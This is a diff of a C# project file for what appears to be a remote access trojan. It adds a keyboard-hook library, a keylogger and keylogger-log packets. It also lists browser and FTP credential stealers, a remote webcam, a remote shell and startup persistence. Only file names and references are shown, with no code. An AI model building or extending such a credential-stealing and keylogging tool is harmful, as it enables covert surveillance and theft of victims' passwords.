@@ -45,6 +45,9 @@
     <Reference Include="Costura, Version=3.3.2.0, Culture=neutral, PublicKeyToken=9919ef960d84173d, processorArchitecture=MSIL">
       <HintPath>..\packages\Costura.Fody.3.3.2\lib\net40\Costura.dll</HintPath>
     </Reference>
+    <Reference Include="Gma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\MouseKeyHook.5.6.0\lib\net40\Gma.System.MouseKeyHook.dll</HintPath>
+    </Reference>
     <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
     <Reference Include="System.Core" />
@@ -68,29 +71,33 @@
     </Reference>
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="Controllers\AuthenticationController.cs" />
-    <Compile Include="Controllers\BootController.cs" />
-    <Compile Include="Controllers\BrowsersControllers\Chrome.cs" />
-    <Compile Include="Controllers\BrowsersControllers\FileZilla.cs" />
-    <Compile Include="Controllers\BrowsersControllers\Firefox.cs" />
-    <Compile Include="Controllers\BrowsersControllers\InternetExplorer.cs" />
-    <Compile Include="Controllers\BrowsersControllers\SQLiteController.cs" />
-    <Compile Include="Controllers\BrowsersControllers\WinSCP.cs" />
-    <Compile Include="Controllers\BrowsersControllers\Yandex.cs" />
+    <Compile Include="Controllers\Tools\AuthenticationController.cs" />
+    <Compile Include="Controllers\Tools\Boot.cs" />
+    <Compile Include="Controllers\Browsers\Chrome.cs" />
+    <Compile Include="Controllers\Browsers\FileZilla.cs" />
+    <Compile Include="Controllers\Browsers\Firefox.cs" />
+    <Compile Include="Controllers\Browsers\InternetExplorer.cs" />
+    <Compile Include="Controllers\Tools\FileSplit.cs" />
+    <Compile Include="Controllers\Tools\Keylogger.cs" />
+    <Compile Include="Controllers\Tools\SQLiteController.cs" />
+    <Compile Include="Controllers\Browsers\WinSCP.cs" />
+    <Compile Include="Controllers\Browsers\Yandex.cs" />
     <Compile Include="Controllers\FileManagerController.cs" />
     <Compile Include="Controllers\KeyLoggerController.cs" />
-    <Compile Include="Controllers\MutexController.cs" />
-    <Compile Include="Controllers\BrowsersControllers\Opera.cs" />
+    <Compile Include="Controllers\Tools\MutexController.cs" />
+    <Compile Include="Controllers\Browsers\Opera.cs" />
     <Compile Include="Controllers\PasswordRecoveryController.cs" />
     <Compile Include="Controllers\RemoteWebcamController.cs" />
     <Compile Include="Controllers\Server\ClientMosaic.cs" />
     <Compile Include="Controllers\RemoteShellController.cs" />
     <Compile Include="Controllers\StartupManagerController.cs" />
-    <Compile Include="Controllers\CommandController.cs" />
+    <Compile Include="Controllers\Tools\CommandController.cs" />
     <Compile Include="Controllers\SystemInformationController.cs" />
     <Compile Include="Controllers\TaskManagerController.cs" />
     <Compile Include="Models\ClientData.cs" />
     <Compile Include="Models\RecoveredAccount.cs" />
+    <Compile Include="Models\Settings.cs" />
+    <Compile Include="Packets\ClientPackets\GetKeyLoggerLogsResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetPasswordsResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetProcessesResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetStartupItemsResponse.cs" />
@@ -119,6 +126,7 @@
     <Compile Include="Packets\ServerPackets\GetDirectory.cs" />
     <Compile Include="Packets\ServerPackets\GetDrives.cs" />
     <Compile Include="Packets\ServerPackets\GetExecuteShellCmd.cs" />
+    <Compile Include="Packets\ServerPackets\GetKeyLoggerLogs.cs" />
     <Compile Include="Packets\ServerPackets\GetMonitors.cs" />
     <Compile Include="Packets\ServerPackets\GetPasswords.cs" />
     <Compile Include="Packets\ServerPackets\GetProcesses.cs" />
